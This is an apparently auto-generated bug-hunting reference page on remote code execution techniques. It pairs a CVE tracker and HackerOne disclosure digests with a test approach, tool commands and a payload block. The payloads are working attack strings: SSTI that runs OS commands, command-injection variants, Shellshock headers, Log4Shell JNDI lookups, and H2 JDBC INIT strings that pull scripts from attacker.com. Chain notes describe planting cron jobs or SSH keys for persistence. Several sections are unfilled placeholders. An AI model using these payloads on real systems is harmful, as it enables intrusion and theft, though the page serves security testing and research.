# RCE Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-04-17 · Items: 1_

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

| CVE | Date | Title | CVSS | Status | Src |
|---|---|---|---|---|---|
| CVE-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |
| cve-2023-34362 | 2026-04-17 | Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) | high | patched | [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362) |

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

- **CVE-2023-34362** — [source](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

- [www.assetnote.io](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---

## Items

> Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.

## Surface

- File upload endpoints — SVG, PHAR, JSP, ASPX, polyglot uploads
- Template engines — SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble
- JDBC/database connection string injection — H2 `INIT=`, PostgreSQL COPY
- XML deserialization — .NET `XmlSerializer`, Java `XMLDecoder`, PHP `unserialize`
- SSRF to internal services — pivot to metadata API, Redis, Memcached, Gopher
- Command injection in shell-invoking functions — `exec`, `system`, `popen`, `Runtime.exec`
- Log4Shell-style JNDI injection in logged user-controlled fields
- Insecure eval/code execution in node.js/Ruby/Python — `eval(params[:code])`

## Test Approach

1. **SSTI detection** — inject math expressions that differ between reflection and eval:

   ```
   {{7*7}}  → 49 = SSTI
   ${7*7}   → 49 = EL/Freemarker
   <%= 7*7 %> → 49 = ERB
   ```

2. **SSTI escalation** (Jinja2):

   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```

3. **File upload — PHAR/JSP**:
   - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
   - Upload SVG with `<script>` or SSRF-triggering XXE
   - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:

   ```
   {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
   ```

5. **Command injection** — probe shell-adjacent params:

   ```
   ?host=127.0.0.1;id
   ?filename=test$(id).txt
   ?cmd=127.0.0.1`id`
   ```

6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
7. **Log4Shell** — probe all headers and params:

   ```
   ${jndi:ldap://collab.attacker.com/a}
   X-Api-Version: ${jndi:ldap://...}
   ```

## Tools

- **nuclei** — SSTI, Log4Shell, RCE templates: `nuclei -t rce/ -u https://target.com`
- **tplmap** — automated SSTI exploitation: `python3 tplmap.py -u "https://target.com/render?name=*"`
- **Interactsh** — OOB callback server for blind RCE: `interactsh-client`
- **ysoserial** — Java deserialization gadget chains: `java -jar ysoserial.jar CommonsCollections6 'id'`
- **commix** — command injection automation: `commix --url="https://target.com/ping?host=*"`

## Payloads / Probes

```
# Werkzeug debugger
# Supply a string with a homoglyph 'і' (Cyrillic) to force an unhandled exception
# If debug mode is on, the interactive debugger spawns
# PIN format: ***-***-*** — brute-forceable when running locally
strіng

# Shellshock — inject in HTTP headers (User-Agent, Referer, Cookie)
() { :;}; echo vulnerable
curl -H "User-Agent: () { :; }; /bin/eject" http://target.com/cgi-bin/test.cgi

# SSTI - Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# SSTI - Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Command injection variants
; id
$(id)
`id`
| id
%0aid

# H2 JDBC RCE
jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/cmd.sql'

# Log4Shell
${jndi:ldap://attacker.interactsh.com/a}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}

# PHP file upload - null byte bypass
filename="shell.php%00.jpg"
```

## Chain Opportunities

- **SSRF → RCE** — SSRF reaches internal Jenkins/Solr/Redis, pivot to code execution
- **SSTI → RCE → persistence** — write cron job or SSH key via template engine
- **File upload → RCE** — bypass extension filter, execute webshell
- **JDBC injection → RCE** — H2/PostgreSQL INIT scripts execute OS commands
- **Deserialization → RCE** — Java/PHP gadget chains in XML, session cookies, API params

## Recent Intel

- **CVE-2023-24489** · Citrix ShareFile pre-auth RCE via `UploadClientModule.asmx` — unsafe .NET XML deserialization, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-34362** · MOVEit Transfer RCE — deserialization in file processing pipeline, SYSTEM-level compromise via crafted file transfer · https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362
- **CVE-2023-38646** · Metabase pre-auth RCE — H2 JDBC `INIT` param via `/api/setup/validate`, SQL → Java method invocation chain · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646

## 2026-04-17

### Patch Diffing Progress MOVEit Transfer RCE (CVE-2023-34362) — `CVE-2023-34362`

- **Tags:** `#rce`
- **Severity:** high · **Hunt:** 4/5 · **Score:** 14.0 · **Status:** patched · **Age:** 30d
- **Sources:** [1](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

**[Patch Diffing Progress MOVEit Transfer RCE]** — A technique to discover RCE vulnerabilities in Progress MOVEit Transfer by analyzing patch differences. Hunt: Check for unpatched MOVEit Transfer instances and analyze patch diffs for RCE vectors. [src](https://www.assetnote.io/resources/research/patch-diffing-progress-moveit-transfer-rce-cve-2023-34362)

---


## 2026-07-01 — H1 disclosures

### Node --run POSIX positional argument escaping allows shell command injection

- **2026-06-23** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3817602](https://hackerone.com/reports/3817602) · Reporter: [@yottt](https://hackerone.com/yottt) · Team: [Node.js](https://hackerone.com/nodejs)
- CWE: OS Command Injection

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`

- **2026-06-11** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3558713](https://hackerone.com/reports/3558713) · Reporter: [@inkerton](https://hackerone.com/inkerton) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: OS Command Injection

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---


## 2026-07-07 — H1 disclosures

### OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)

- **2026-07-06** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3637898](https://hackerone.com/reports/3637898) · Reporter: [@kaporia](https://hackerone.com/kaporia) · Team: [AWS VDP](https://hackerone.com/aws_vdp)
- CWE: OS Command Injection

**What**

A vulnerability was discovered in the "aws-cdk-lib" NodejsFunction that allowed for OS command injection through the unsanitized "OsCommand" helper. The vulnerability was caused by the lack of proper escaping of user-controlled data when constructing shell commands during Docker-based bundling. This could have potentially led to arbitrary code execution within the Docker container, which had access to the host filesystem through bind mounts.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

## 2026-10-21 — PHP Core RCE (php2shell)

### CVE-2026-109618 / CVE-2026-109619 — PHP Core Remote Code Execution (php2shell)
- **Date:** 2026-10-21 · **Source:** [phoenix.security](https://phoenix.security/php-core-rce-cve-2026-109618-109619-critical-remote-code-execution/) · **Class:** cve
- **What:** Two RCE flaws in PHP core (CVSS v4.0 9.2) affecting PHP 5.4+ — patch shipped Oct 21 for supported branches (8.2–8.5); PHP ≤8.1 EOL and unpatched.
- **Why it matters:** Any PHP-based web target on EOL PHP is a live unauthenticated RCE; mass exploitation expected within days of patch release.
- **Hunt signal:** `nuclei -t php/php-version-detection.yaml` — fingerprint PHP version on target; pivot to EOL installations; check `X-Powered-By` / `phpinfo()` leaks.
- **Evidence:** [sansec.io](https://sansec.io/research/php2shell) · [securelayer7 analysis](https://blog.securelayer7.net/php-rce-cve-2026-109618-109619/) · [Beazley advisory BSL-A1233](https://labs.beazley.security/advisories/BSL-A1233)
- **KEV status:** Not listed (no ITW exploitation confirmed as of 2026-10-21 UTC 14:00)
- **PoC:** PUBLIC — leaked as "PHP2Shell"; watchTowr reproduced CVE-2026-109618; full chain not yet published
